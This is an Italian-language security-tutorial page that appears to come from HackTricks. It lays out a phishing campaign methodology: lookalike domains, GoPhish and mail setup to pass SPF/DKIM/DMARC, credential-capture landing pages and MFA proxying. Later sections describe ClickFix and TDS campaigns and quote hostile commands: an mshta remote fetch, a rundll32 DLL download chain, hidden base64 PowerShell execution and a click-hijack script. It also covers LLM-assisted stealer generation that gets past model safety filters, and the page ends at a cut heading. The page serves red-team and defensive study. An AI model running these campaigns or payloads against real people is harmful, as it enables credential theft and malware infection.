# Metodologia di Phishing

{{#include ../../banners/hacktricks-training.md}}

## Metodologia

1. Esegui la ricognizione sulla vittima
1. Seleziona il **dominio della vittima**.
2. Esegui una semplice enumerazione web **cercando i portali di login** usati dalla vittima e **decidi** quale **impersonare**.
3. Usa alcune tecniche di **OSINT** per **trovare gli indirizzi email**.
2. Prepara l'ambiente
1. **Acquista il dominio** che utilizzerai per la valutazione di phishing
2. **Configura i record** correlati al servizio email (SPF, DMARC, DKIM, rDNS)
3. Configura il VPS con **gophish**
3. Prepara la campagna
1. Prepara il **template email**
2. Prepara la **pagina web** per rubare le credenziali
4. Avvia la campagna!

## Generare nomi di dominio simili o acquistare un dominio affidabile

### Tecniche di variazione dei nomi di dominio

- **Keyword**: Il nome di dominio **contiene una **keyword** importante** del dominio originale (ad esempio, zelster.com-management.com).<sup>[[1]](#references)</sup>
- **sottodominio con trattino**: Sostituisci il **punto con un trattino** in un sottodominio (ad esempio, www-zelster.com).
- **Nuovo TLD**: Stesso dominio usando un **nuovo TLD** (ad esempio, zelster.org)
- **Homoglyph**: **Sostituisce** una lettera nel nome di dominio con **lettere dall'aspetto simile** (ad esempio, zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Trasposizione:** **Scambia due lettere** all'interno del nome di dominio (ad esempio, zelsetr.com).
- **Singolarizzazione/Pluralizzazione**: Aggiunge o rimuove la “s” alla fine del nome di dominio (ad esempio, zeltsers.com).
- **Omissione**: **Rimuove una** delle lettere dal nome di dominio (ad esempio, zelser.com).
- **Ripetizione:** **Ripete una** delle lettere nel nome di dominio (ad esempio, zeltsser.com).
- **Sostituzione**: Come Homoglyph, ma meno furtiva. Sostituisce una delle lettere nel nome di dominio, possibilmente con una lettera vicina a quella originale sulla tastiera (ad esempio, zektser.com).
- **Con sottodominio**: Inserisce un **punto** all'interno del nome di dominio (ad esempio, ze.lster.com).
- **Inserimento**: **Inserisce una lettera** nel nome di dominio (ad esempio, zerltser.com).
- **Punto mancante**: Aggiunge il TLD al nome di dominio (ad esempio, zelstercom.com)

**Strumenti automatici**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Siti web**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

Esiste la **possibilità che alcuni bit memorizzati o in fase di comunicazione possano essere modificati automaticamente** a causa di vari fattori, come brillamenti solari, raggi cosmici o errori hardware.

Quando questo concetto viene **applicato alle richieste DNS**, è possibile che il **dominio ricevuto dal server DNS** non sia lo stesso dominio richiesto inizialmente.

Ad esempio, una modifica di un singolo bit nel dominio "windows.com" può trasformarlo in "windnws.com."

Gli aggressori possono **approfittarne registrando più domini bit-flipping** simili al dominio della vittima. Il loro intento è reindirizzare gli utenti legittimi verso la propria infrastruttura.

Per ulteriori informazioni, leggi [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/).<sup>[[10]](#references)[[11]](#references)</sup>

### Acquistare un dominio affidabile

Puoi cercare su [https://www.expireddomains.net/](https://www.expireddomains.net) un dominio scaduto che potresti utilizzare.\
Per assicurarti che il dominio scaduto che stai per acquistare **abbia già un buon SEO**, puoi controllare come è categorizzato in:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## Scoprire gli indirizzi email

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% gratuito)
- [https://phonebook.cz/](https://phonebook.cz) (100% gratuito)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

Per **scoprire più** indirizzi email validi o **verificare quelli** che hai già scoperto, puoi controllare se è possibile eseguire il brute-force dei server SMTP della vittima. [Scopri qui come verificare/scoprire un indirizzo email](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
Inoltre, non dimenticare che, se gli utenti utilizzano **un qualsiasi portale web per accedere alle proprie email**, puoi verificare se è vulnerabile al **brute force degli username** e sfruttare la vulnerabilità, se possibile.

## Configurazione di GoPhish

### Installazione

Puoi scaricarlo da [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)

Scaricalo e decomprimilo all'interno di `/opt/gophish`, quindi esegui `/opt/gophish/gophish`\
Nell'output ti verrà fornita una password per l'utente admin sulla porta 3333. Pertanto, accedi a quella porta e usa tali credenziali per modificare la password dell'admin. Potrebbe essere necessario effettuare il tunneling di quella porta verso il locale:
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### Configurazione

**Configurazione del certificato TLS**

Prima di questo passaggio dovresti **aver già acquistato il dominio** che intendi utilizzare e questo deve **puntare** all'**IP del VPS** in cui stai configurando **gophish**.
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**Configurazione della posta**

Inizia installando: `apt-get install postfix`

Poi aggiungi il dominio ai seguenti file:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**Modifica anche i valori delle seguenti variabili all'interno di /etc/postfix/main.cf**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Infine modifica i file **`/etc/hostname`** e **`/etc/mailname`** inserendo il nome del tuo dominio e **riavvia il tuo VPS.**

Ora crea un **record DNS A** per `mail.<domain>` che punti all'**indirizzo IP** del VPS e un **record DNS MX** che punti a `mail.<domain>`

Ora testiamo l'invio di un'e-mail:
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Configurazione di Gophish**

Arresta l'esecuzione di Gophish e configuriamolo.\
Modifica `/opt/gophish/config.json` come segue (nota l'uso di https):
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**Configura il servizio gophish**

Per creare il servizio gophish in modo che possa essere avviato automaticamente e gestito come servizio, puoi creare il file `/etc/init.d/gophish` con il seguente contenuto:
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
Completa la configurazione del servizio e verificalo eseguendo:
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## Configurazione del mail server e del dominio

### Attendi e sii legittimo

Più un dominio è vecchio, meno è probabile che venga rilevato come spam. Dovresti quindi attendere il più a lungo possibile (almeno 1 settimana) prima del phishing assessment. Inoltre, se inserisci una pagina relativa a un settore con una buona reputazione, la reputazione ottenuta sarà migliore.

Nota che, anche se devi attendere una settimana, puoi terminare subito la configurazione di tutto.

### Configura il record Reverse DNS (rDNS)

Imposta un record rDNS (PTR) che risolva l'indirizzo IP del VPS nel nome di dominio.

### Record Sender Policy Framework (SPF)

Devi **configurare un record SPF per il nuovo dominio**. Se non sai cosa sia un record SPF [**leggi questa pagina**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

Puoi usare [https://www.spfwizard.net/](https://www.spfwizard.net) per generare la tua policy SPF (usa l'IP della macchina VPS)

![Modulo SPF Wizard per generare un record SPF per un dominio di phishing](<../../images/image (1037).png>)

Questo è il contenuto che deve essere impostato all'interno di un record TXT nel dominio:
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### Record DMARC (Domain-based Message Authentication, Reporting & Conformance)

Devi **configurare un record DMARC per il nuovo dominio**. Se non sai cos'è un record DMARC, [**leggi questa pagina**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

Devi creare un nuovo record DNS TXT che punti all'hostname `_dmarc.<domain>` con il seguente contenuto:
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

Devi **configurare un DKIM per il nuovo dominio**. Se non sai cosa sia un record DKIM [**leggi questa pagina**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

Questo tutorial si basa su: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy).<sup>[[5]](#references)</sup>

> [!TIP]
> Devi concatenare entrambi i valori B64 generati dalla chiave DKIM:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### Testa il punteggio della configurazione email

Puoi farlo usando [https://www.mail-tester.com/](https://www.mail-tester.com)\
Accedi semplicemente alla pagina e invia un'email all'indirizzo che ti viene fornito:
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
Puoi anche **verificare la configurazione della tua email** inviando un'email a `check-auth@verifier.port25.com` e **leggendo la risposta** (per farlo dovrai **aprire** la porta **25** e visualizzare la risposta nel file _/var/mail/root_ se invii l'email come root).\
Verifica di superare tutti i test:
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
Potresti anche inviare un **messaggio a un account Gmail sotto il tuo controllo** e controllare le **intestazioni dell'email** nella tua casella di posta Gmail: `dkim=pass` dovrebbe essere presente nel campo dell'intestazione `Authentication-Results`.
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### ​Rimozione dalla blacklist di Spamhaus

La pagina [www.mail-tester.com](https://www.mail-tester.com) può indicarti se il tuo dominio viene bloccato da Spamhaus. Puoi richiedere la rimozione del tuo dominio/IP su: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Rimozione dalla blacklist di Microsoft

​​Puoi richiedere la rimozione del tuo dominio/IP su [https://sender.office.com/](https://sender.office.com).

## Creazione e avvio della campagna GoPhish

### Profilo di invio

- Imposta un **nome per identificare** il profilo del mittente
- Decidi da quale account invierai le email di phishing. Suggerimenti: _noreply, support, servicedesk, salesforce..._
- Puoi lasciare vuoti il nome utente e la password, ma assicurati di selezionare Ignore Certificate Errors

![Creazione e avvio della campagna GoPhish - Profilo di invio: puoi lasciare vuoti il nome utente e la password, ma assicurati di selezionare Ignore Certificate Errors](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> È consigliato utilizzare la funzionalità "**Send Test Email**" per verificare che tutto funzioni.\
> Ti consiglio di **inviare le email di test a indirizzi email temporanei da 10 minuti** per evitare di finire in blacklist durante i test.

### Modello email

- Imposta un **nome per identificare** il modello
- Poi scrivi un **oggetto** (nulla di strano, solo qualcosa che ti aspetteresti di leggere in una normale email)
- Assicurati di aver selezionato "**Add Tracking Image**"
- Scrivi il **modello dell'email** (puoi utilizzare variabili come nell'esempio seguente):
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
Nota che **per aumentare la credibilità dell'email**, è consigliato usare una firma proveniente da un'email del cliente. Suggerimenti:

- Invia un'email a un **indirizzo inesistente** e verifica se la risposta contiene una firma.
- Cerca **email pubbliche** come info@ex.com, press@ex.com o public@ex.com, invia loro un'email e attendi la risposta.
- Prova a contattare un indirizzo **valido individuato** e attendi la risposta.

![Sending Profile - Email Template: Try to contact some valid discovered email and wait for the response](<../../images/image (80).png>)

> [!TIP]
> L'Email Template consente anche di **allegare file da inviare**. Se desideri inoltre sottrarre challenge NTLM usando file/documenti appositamente creati [leggi questa pagina](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Landing Page

- Inserisci un **nome**
- **Inserisci il codice HTML** della pagina web. Nota che puoi **importare** pagine web.
- Seleziona **Capture Submitted Data** e **Capture Passwords**
- Imposta un **reindirizzamento**

![Email Template - Landing Page: Mark Capture Submitted Data and Capture Passwords](<../../images/image (826).png>)

> [!TIP]
> Di solito dovrai modificare il codice HTML della pagina ed effettuare alcuni test in locale (magari usando un server Apache) **finché non sarai soddisfatto del risultato.** Quindi inserisci quel codice HTML nel campo.\
> Nota che, se devi **usare risorse statiche** per l'HTML (ad esempio pagine CSS e JS), puoi salvarle in _**/opt/gophish/static/endpoint**_ e poi accedervi da _**/static/\<filename>**_

> [!TIP]
> Per il reindirizzamento puoi **reindirizzare gli utenti alla pagina web principale legittima** della vittima, oppure reindirizzarli, ad esempio, a _/static/migration.html_, inserire una **rotella di caricamento (**[**https://loading.io/**](https://loading.io)**) per 5 secondi e poi indicare che il processo è stato completato con successo**.

### Users & Groups

- Imposta un nome
- **Importa i dati** (nota che, per usare il template dell'esempio, servono il nome, il cognome e l'indirizzo email di ogni utente)

![Landing Page - Users & Groups: Import the data (note that in order to use the template for the example you need the firstname, last name and email address of each user)](<../../images/image (163).png>)

### Campaign

Infine, crea una campaign selezionando un nome, l'email template, la landing page, l'URL, il sending profile e il gruppo. Nota che l'URL sarà il link inviato alle vittime.

Nota che il **Sending Profile consente di inviare un'email di test per verificare come apparirà l'email di phishing finale**:

![Users & Groups - Campaign: Note that the Sending Profile allow to send a test email to see how will the final phishing email looks like](<../../images/image (192).png>)

Quando tutto è pronto, avvia semplicemente la campaign!

## Website Cloning

Se per qualsiasi motivo vuoi clonare il sito web, consulta la pagina seguente:


{{#ref}}
clone-a-website.md
{{#endref}}

## Backdoored Documents & Files

In alcune valutazioni di phishing (principalmente per Red Teams) potresti voler **inviare anche file contenenti una qualche forma di backdoor** (magari un C2 o semplicemente qualcosa che attivi un'autenticazione).\
Consulta la pagina seguente per alcuni esempi:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Via Proxy MitM

L'attacco precedente è piuttosto ingegnoso, poiché simula un sito web reale e raccoglie le informazioni inserite dall'utente. Sfortunatamente, se l'utente non ha inserito la password corretta o se l'applicazione simulata è configurata con la 2FA, **queste informazioni non ti permetteranno di impersonare l'utente ingannato**.

È qui che strumenti come [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) e [**muraena**](https://github.com/muraenateam/muraena) sono utili. Questo strumento consente di generare un attacco simile a un MitM. In pratica, gli attacchi funzionano nel modo seguente:

1. **Impersoni il form di login** della pagina web reale.
2. L'utente **invia** le proprie **credenziali** alla tua pagina falsa e lo strumento le invia alla pagina web reale, **verificando se le credenziali funzionano**.
3. Se l'account è configurato con la **2FA**, la pagina MitM la richiederà e, una volta che l'**utente la inserisce**, lo strumento la invierà alla pagina web reale.
4. Una volta autenticato l'utente, tu (in qualità di attacker) avrai **catturato le credenziali, la 2FA, il cookie e qualsiasi informazione** relativa a ogni interazione avvenuta mentre lo strumento esegue un MitM.

### Via VNC

E se, invece di **inviare la vittima a una pagina malevola** con lo stesso aspetto di quella originale, la inviassi a una **sessione VNC con un browser connesso alla pagina web reale**? Potresti vedere ciò che fa, sottrarre la password, l'MFA utilizzata, i cookie...\
Puoi farlo con [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC).<sup>[[3]](#references)[[4]](#references)</sup>

## Detecting the detection

Ovviamente, uno dei modi migliori per sapere se sei stato scoperto è **cercare il tuo dominio all'interno delle blacklist**. Se compare nell'elenco, in qualche modo il tuo dominio è stato rilevato come sospetto.\
Un modo semplice per verificare se il tuo dominio compare in una blacklist consiste nell'usare [https://malwareworld.com/](https://malwareworld.com)

Tuttavia, esistono altri modi per sapere se la vittima sta **cercando attivamente attività di phishing sospette nel web** come spiegato in:


{{#ref}}
detecting-phising.md
{{#endref}}

Puoi **acquistare un dominio con un nome molto simile** a quello del dominio della vittima **e/o generare un certificato** per un **sottodominio** di un dominio controllato da te, **contenente** la **keyword** del dominio della vittima. Se la **vittima** esegue qualsiasi tipo di **interazione DNS o HTTP** con essi, saprai che sta **cercando attivamente** domini sospetti e dovrai essere molto stealth.<sup>[[2]](#references)</sup>

### Evaluate the phishing

Usa [**Phishious** ](https://github.com/Rices/Phishious)per valutare se la tua email finirà nella cartella spam, verrà bloccata o avrà successo.

## High-Touch Identity Compromise (Help-Desk MFA Reset)

I moderni intrusion set evitano sempre più spesso le email lure e **prendono direttamente di mira il workflow del service desk / identity recovery** per aggirare la MFA. L'attacco è completamente "living-off-the-land": una volta ottenute credenziali valide, l'operator si sposta usando strumenti di amministrazione integrati: non è richiesto alcun malware.<sup>[[6]](#references)</sup>

### Attack flow
1. Ricognizione della vittima
* Raccogliere dettagli personali e aziendali da LinkedIn, data breach, GitHub pubblico, ecc.
* Identificare le identità di alto valore (executive, IT, finance) e enumerare l'**esatto processo dell'help-desk** per il reset della password / MFA.
2. Social engineering in tempo reale
* Chiamare, usare Teams o contattare via chat l'help-desk impersonando il target (spesso con **caller-ID falsificato** o **voce clonata**).
* Fornire i dati personali precedentemente raccolti per superare la verifica basata sulla conoscenza.
* Convincere l'agent a **reimpostare il secret MFA** o a eseguire un **SIM-swap** su un numero di cellulare registrato.
3. Azioni immediate post-accesso (≤60 min nei casi reali)
* Stabilire un foothold tramite qualsiasi portale web SSO.
* Enumerare AD / AzureAD con strumenti integrati (senza depositare binari):
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* Eseguire il movimento laterale con **WMI**, **PsExec** o agent **RMM** legittimi già autorizzati nell'ambiente.

### Detection & Mitigation
* Trattare il recupero dell'identità tramite help-desk come un'**operazione privilegiata**: richiedere step-up auth e approvazione del manager.
* Implementare regole di **Identity Threat Detection & Response (ITDR)** / **UEBA** che generino un alert per:
* Metodo MFA modificato + autenticazione da un nuovo dispositivo / area geografica.
* Immediata elevazione dello stesso principal (user-→-admin).
* Registrare le chiamate all'help-desk e imporre una **richiamata a un numero già registrato** prima di qualsiasi reset.
* Implementare **Just-In-Time (JIT) / Privileged Access**, in modo che gli account appena reimpostati **non ereditino automaticamente token con privilegi elevati**.

---

## At-Scale Deception – SEO Poisoning & “ClickFix” Campaigns
I gruppi criminali commodity compensano il costo delle operazioni high-touch con attacchi su vasta scala che trasformano **search engine e ad network nel canale di delivery**.<sup>[[6]](#references)</sup>

1. Il **SEO poisoning / malvertising** porta in cima agli annunci di ricerca un risultato falso come `chromium-update[.]site`.
2. La vittima scarica un piccolo **first-stage loader** (spesso JS/HTA/ISO). Esempi osservati da Unit 42:
* `RedLine stealer`
* `Lumma stealer`
* `Lampion Trojan`
3. Il loader esfiltra cookie del browser e database delle credenziali, poi scarica un **silent loader** che decide, *in realtime*, se distribuire:
* RAT (ad esempio AsyncRAT, RustDesk)
* ransomware / wiper
* componente di persistenza (chiave Run del registry + scheduled task)

### Hardening tips
* Bloccare i domini registrati di recente e applicare **Advanced DNS / URL Filtering** anche agli *search ads*, oltre che alle email.
* Limitare l'installazione del software a pacchetti MSI / Store firmati; negare l'esecuzione di `HTA`, `ISO`, `VBS` tramite policy.
* Monitorare i processi child dei browser che aprono installer:
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* Cercare LOLBins spesso abusati dai first-stage loader (ad esempio `regsvr32`, `curl`, `mshta`).

### Download-button click hijacking with TDS handoff
Alcuni portali di software falsi mantengono l'`href` di download visibile puntato all'URL **reale** di GitHub/release, ma dirottano la **prima** interazione dell'utente in JavaScript e inviano invece la vittima in una catena di **Traffic Distribution System (TDS)**.<sup>[[9]](#references)</sup>
```javascript
const cachedOpen = window.open;
document.addEventListener(isChromeDesktop() ? "mousedown" : "click", (e) => {
if (!isEligibleClick(e.target)) return;
cachedOpen(generateRuntimeURL({referrer: location.href, userDestination: extractClickedLink(e.target)}));
e.stopImmediatePropagation();
e.preventDefault();
}, true);
```
Caratteristiche principali:
- L’hook viene solitamente eseguito nella **capture phase** (`true`) su `document`, quindi si attiva prima degli handler del sito.
- Chrome utilizza spesso `mousedown` invece di `click` per mantenere il redirect associato a un **user gesture** valido e migliorare l’elusione dei popup blocker.
- Alcune varianti aprono preventivamente `about:blank` o simulano clic su elementi `<a target="_blank">`, assegnando l’URL TDS solo in un secondo momento.
- I limiti lato browser sono spesso memorizzati in `localStorage`, quindi il **primo clic** può raggiungere il malware, mentre refresh e nuovi tentativi ricadono sul link visibile dall’aspetto innocuo.
- Il TDS può filtrare in base a referrer, entry domain, GEO, browser/device fingerprint, controlli VPN/datacenter, contesto del clic e contatori per sessione, rendendo le riproduzioni degli analisti non deterministiche.

Idee per i defender:
- Confrontare l’`href` **visualizzato** con la destinazione di navigazione **effettiva** generata al momento del clic.
- Cercare handler `document.addEventListener(..., true)` che chiamano sia `preventDefault()` sia `stopImmediatePropagation()` insieme a `window.open`, `about:blank` o clic sintetici su anchor.
- Considerare i cluster di domini per il download di software registrati di recente, che caricano tutti lo stesso stage CloudFront/JS, come un pattern ad alto segnale di SEO poisoning/TDS.

### ClickFix da pagine di verifica false + fetch di LOLBAS dall’aspetto di archivio
Alcuni rami TDS terminano in una pagina di verifica falsa (in stile Cloudflare/IUAM) che indica alla vittima di eseguire un binario Windows affidabile come:<sup>[[9]](#references)</sup>
```cmd
C:\Windows\SysWOW64\mshta.exe https://example[.]com/navy.7z
```
Note:
- `mshta.exe` esegue **HTA/VBScript all'inizio della risposta**, anche se l'URL finge di puntare a un archivio `.7z`; i dati dell'archivio aggiunti possono essere puro depistaggio.
- Gli stage successivi spesso continuano a mentire sul tipo di file (`.rtf` per PowerShell, `.asar` per Python, ZIP con binari imbottiti) e poi passano al **mapping manuale dei PE / all'esecuzione in memoria**.
- Se stai rispondendo a una di queste catene, conserva **rete + memoria dalla prima esecuzione riuscita**: i replay successivi potrebbero mostrare solo un percorso benigno dell'installer/SFX oppure fallire perché il rilascio del payload/della chiave era associato alla sessione TDS originale.

### Tattiche di distribuzione di DLL tramite ClickFix (finto aggiornamento CERT)
* Esca: avviso CERT nazionale clonato con un pulsante **Update** che mostra istruzioni dettagliate per la “correzione”. Alle vittime viene detto di eseguire un batch che scarica una DLL e la esegue tramite `rundll32`.<sup>[[12]](#references)</sup>
* Catena batch tipica osservata:
```cmd
echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
echo timeout /t 10
echo rundll32.exe "%TEMP%\notepad2.dll",notepad
```
* `Invoke-WebRequest` salva il payload in `%TEMP%`, una breve attesa nasconde il jitter di rete, quindi `rundll32` chiama l'entrypoint esportato (`notepad`).
* La DLL invia l'identità dell'host ed esegue il polling verso C2 ogni pochi minuti. I task remoti arrivano come **PowerShell codificato in base64**, eseguito in modo nascosto e con bypass delle policy:
```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
```
* Questo mantiene la flessibilità del C2 (il server può sostituire i task senza aggiornare la DLL) e nasconde le finestre della console. Cerca processi PowerShell figli di `rundll32.exe` che usano insieme `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression`.
* I difensori possono cercare callback HTTP(S) nella forma `...page.php?tynor=<COMPUTER>sss<USER>` e intervalli di polling di 5 minuti dopo il caricamento della DLL.

---

## Operazioni di phishing potenziate dall'AI
Gli attaccanti ora concatenano **API LLM e di clonazione vocale** per creare esche completamente personalizzate e interagire in tempo reale.

| Livello | Esempio di utilizzo da parte dell'attore della minaccia |
|-------|-------------|
|Automazione|Generare e inviare >100.000 email / SMS con formulazioni randomizzate e link di tracking.|
|AI generativa|Produrre email *una tantum* che fanno riferimento a operazioni M&A pubbliche e a battute interne ricavate dai social media; usare la voce deepfake del CEO nelle truffe con callback.|
|AI agentica|Registrare autonomamente domini, raccogliere informazioni open-source e creare email per lo stage successivo quando una vittima fa clic ma non invia le credenziali.|

**Difesa:**
• Aggiungi **banner dinamici** che evidenzino i messaggi inviati da sistemi di automazione non attendibili (tramite anomalie ARC/DKIM).
• Implementa **frasi di verifica vocali biometriche** per le richieste telefoniche ad alto rischio.
• Simula continuamente esche generate dall'AI nei programmi di sensibilizzazione: i template statici sono obsoleti.

Vedi anche – abuso della navigazione agentica per il credential phishing:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

Vedi anche – abuso degli AI agent degli strumenti CLI locali e di MCP (per l'inventario dei segreti e il rilevamento):

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## Assemblaggio runtime di JavaScript per il phishing assistito da LLM (codegen nel browser)

Gli attaccanti possono distribuire HTML dall'aspetto benigno e **generare lo stealer a runtime** chiedendo JavaScript a una **trusted LLM API**, per poi eseguirlo nel browser (ad esempio tramite `eval` o `<script>` dinamico).<sup>[[8]](#references)</sup>

1. **Prompt come offuscamento:** codificare gli URL di esfiltrazione e le stringhe Base64 nel prompt; iterare la formulazione per aggirare i filtri di sicurezza e ridurre le allucinazioni.
2. **Chiamata API lato client:** al caricamento, JS chiama un LLM pubblico (Gemini/DeepSeek/ecc.) o un proxy CDN; nell'HTML statico sono presenti solo il prompt e la chiamata API.
3. **Assemblaggio ed esecuzione:** concatenare la risposta ed eseguirla (polimorfica a ogni visita):
```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/exfil:** il codice generato personalizza l'esca (ad esempio, il parsing del token di LogoKit) e invia le creds all'endpoint nascosto nel prompt.

**Caratteristiche di evasione**
- Il traffico raggiunge domini LLM noti o proxy CDN affidabili; talvolta tramite WebSockets verso un backend.
- Nessun payload statico; il codice JS malevolo esiste solo dopo il rendering.
- Le generazioni non deterministiche producono **stealer unici** per sessione.

**Idee per il rilevamento**
- Esegui sandbox con JS abilitato; segnala **`eval` in fase di runtime/creazione dinamica di script provenienti da risposte LLM**.
- Cerca POST dal front-end verso API LLM immediatamente seguiti da `eval`/`Function` sul testo restituito.
- Genera un alert per i domini LLM non autorizzati nel traffico client, seguiti da POST delle credenziali.

---

## Variante MFA Fatigue / Push Bombing – Reset forzato
